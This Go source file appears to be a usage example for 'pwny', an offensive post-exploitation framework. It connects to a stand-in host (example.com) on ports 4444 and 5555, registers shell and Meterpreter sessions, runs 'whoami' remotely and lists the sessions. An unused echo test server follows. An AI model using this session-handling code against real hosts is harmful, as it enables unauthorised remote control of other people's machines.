// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2025 kdsmith18542

package main

import (
	"fmt"
	"log"
	"net"

	"github.com/kdsmith18542/pwny/internal/core"
)

func main() {
	sessionMgr := core.NewSessionManager()

	shellConn, err := net.Dial("tcp", "example.com:4444")
	if err != nil {
		log.Fatalf("Failed to dial: %v", err)
	}
	shellSession, err := sessionMgr.NewSession(core.SessionTypeShell, shellConn)
	if err != nil {
		log.Fatalf("Failed to create shell session: %v", err)
	}

	output, err := shellSession.Execute("whoami")
	if err != nil {
		log.Printf("Command failed: %v", err)
	} else {
		fmt.Printf("Command output: %s\n", output)
	}

	meterpreterConn, err := net.Dial("tcp", "example.com:5555")
	if err != nil {
		log.Fatalf("Failed to dial: %v", err)
	}
	_, err = sessionMgr.NewSession(core.SessionTypeMeterpreter, meterpreterConn)
	if err != nil {
		log.Fatalf("Failed to create meterpreter session: %v", err)
	}

	fmt.Println("\nActive sessions:")
	for _, info := range sessionMgr.ListSessions() {
		fmt.Printf("- %s (%s) - %s\n", info.ID, info.Type, info.Status)
	}

	select {}
}

func startTestServer(port string, handler func(net.Conn)) (net.Listener, error) {
	ln, err := net.Listen("tcp", ":"+port)
	if err != nil {
		return nil, err
	}

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				continue
			}
			go handler(conn)
		}
	}()

	return ln, nil
}

func exampleShellHandler(conn net.Conn) {
	defer conn.Close()

	buf := make([]byte, 1024)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			return
		}
		conn.Write(buf[:n])
	}
}
